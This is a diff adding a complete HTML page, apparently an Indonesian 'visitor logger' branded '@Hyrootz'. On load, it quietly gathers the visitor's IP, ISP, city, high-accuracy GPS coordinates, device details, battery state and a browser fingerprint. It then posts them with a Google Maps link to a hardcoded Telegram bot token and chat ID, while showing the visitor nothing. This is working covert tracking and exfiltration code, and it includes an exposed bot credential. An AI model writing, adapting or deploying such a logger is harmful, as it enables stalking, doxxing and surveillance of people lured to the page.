@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Visitor Info</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      font-size: 2rem;
+      animation: blink 1s infinite;
+      margin: 0;
+    }
+    .info-box {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      justify-content: center;
+      font-size: 0.9rem;
+    }
+    .label {
+      background: rgba(255,255,255,0.05);
+      padding: 6px 12px;
+      border-radius: 8px;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .small {
+      font-size: 0.75rem;
+      opacity: 0.8;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+    a {
+      color: #0ff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>@Hyrootz</h1>
+  <div class="info-box" id="info-box">
+    <!-- Tidak lagi diisi lewat JS -->
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8053780203:AAFAV7b_NYcbj2NmakX3_Az4dTnYigPmelA";
+    const OWNER_CHAT_ID = "7813060570"; // <-- Ganti sesuai
+
+    async function generateFingerprint() {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const res = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const ram = navigator.deviceMemory || "N/A";
+      const cpu = navigator.hardwareConcurrency || "N/A";
+      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
+      const encoder = new TextEncoder();
+      const data = encoder.encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
+    }
+
+    async function getVisitorInfo() {
+      const clock = new Date().toLocaleString();
+      let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
+      let country = "N/A", province = "N/A", city = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";
+
+      const userAgent = navigator.userAgent;
+      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
+      const device = navigator.platform + " - " + userAgent;
+      const loginFrom = navigator.platform || "N/A";
+      const language = navigator.language || "N/A";
+      const resolution = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const isOnline = navigator.onLine;
+      const deviceMemory = navigator.deviceMemory || "N/A";
+      const cpuCores = navigator.hardwareConcurrency || "N/A";
+      const isTouch = 'ontouchstart' in window;
+      const cookiesEnabled = navigator.cookieEnabled;
+      const doNotTrack = navigator.doNotTrack;
+      const fingerprint = await generateFingerprint();
+
+      // Battery
+      const batteryInfo = await navigator.getBattery().then(battery => {
+        return {
+          "battery level": Math.round(battery.level * 100) + "%",
+          "charging": battery.charging ? "yes" : "no"
+        };
+      }).catch(() => ({
+        "battery level": "N/A",
+        "charging": "N/A"
+      }));
+
+      // Ambil IP & ISP dari ipapi.co (org termasuk ISP)
+      try {
+        const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
+        ip = ipData.ip || "N/A";
+        country = ipData.country_name || "N/A";
+        province = ipData.region || "N/A";
+        city = ipData.city || "N/A";
+        latitude = ipData.latitude || latitude;
+        longitude = ipData.longitude || longitude;
+        namaISP = ipData.org || "N/A";
+      } catch (e) {
+        // fallback tetap N/A
+      }
+
+      try {
+        const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
+        if (weatherData.current_condition && weatherData.current_condition[0]) {
+          weather = weatherData.current_condition[0].weatherDesc[0].value;
+          temperature = weatherData.current_condition[0].temp_C + "°C";
+        }
+      } catch {}
+
+      try {
+        await new Promise((resolve) => {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              latitude = pos.coords.latitude.toFixed(6);
+              longitude = pos.coords.longitude.toFixed(6);
+              accuracy = pos.coords.accuracy + "m";
+              resolve();
+            },
+            () => resolve(),
+            { enableHighAccuracy: true, timeout: 5000 }
+          );
+        });
+      } catch {}
+
+      const jsonData = {
+        "nama": namaISP,
+        "alamat ip": ip,
+        "device": device,
+        "android versions": androidVersion,
+        "login from": loginFrom,
+        "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
+        "country": country,
+        "province": province,
+        "city": city,
+        "clock": clock,
+        "weather": weather,
+        "temperature": temperature,
+        "language": language,
+        "screen resolution": resolution,
+        "timezone": timezone,
+        "online": isOnline,
+        "ram (GB)": deviceMemory,
+        "cpu cores": cpuCores,
+        "touch support": isTouch,
+        "cookies enabled": cookiesEnabled,
+        "do not track": doNotTrack,
+        "fingerprint": fingerprint,
+        "battery": batteryInfo["battery level"],
+        "charging": batteryInfo["charging"]
+      };
+
+      const coordsForMap = (latitude !== "N/A" && longitude !== "N/A") ? `${latitude},${longitude}` : "";
+      let mapsUrl = "";
+      if (coordsForMap) {
+        mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(coordsForMap)}`;
+      }
+
+      const message =
+`📥 *New Visitor Logged*
+
+🌐 **Network**
+• ISP: \`${jsonData.nama}\`
+• IP: \`${jsonData["alamat ip"]}\`
+• Country: \`${jsonData.country}\`
+• Region: \`${jsonData.province}\`
+• City: \`${jsonData.city}\`
+
+📍 **Location**
+• Maps: ${mapsUrl ? mapsUrl : "tidak tersedia"}
+• Accuracy: \`${jsonData.lokasi.split("(")[1]?.replace(")", "") || "N/A"}\`
+
+📅 **Device**
+• Platform: \`Android ${jsonData["android versions"]}\`
+• Device: \`${jsonData.device}\`
+• Screen: \`${jsonData["screen resolution"]}\`
+• Memory: \`${jsonData["ram (GB)"]} GB RAM\`
+• Cores: \`${jsonData["cpu cores"]}\`
+• Touch: \`${jsonData["touch support"] ? "✅" : "❌"}\`
+• Cookies: \`${jsonData["cookies enabled"] ? "✅" : "❌"}\`
+• Do-Not-Track: \`${jsonData["do not track"] === "1" ? "✅" : "❌"}\`
+
+🔋 **Battery**
+• Level: \`${jsonData.battery}\`
+• Charging: \`${jsonData.charging === "yes" ? "Yes" : "No"}\`
+
+🌤️ **Weather**
+• Condition: \`${jsonData.weather}\`
+• Temperature: \`${jsonData.temperature}\`
+
+⏰ **Timestamp**
+• Local: \`${jsonData.clock}\`
+
+🆔 **Fingerprint**
+\`${jsonData.fingerprint}\``;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: OWNER_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+
+    getVisitorInfo();
+  </script>
+</body>
+</html>
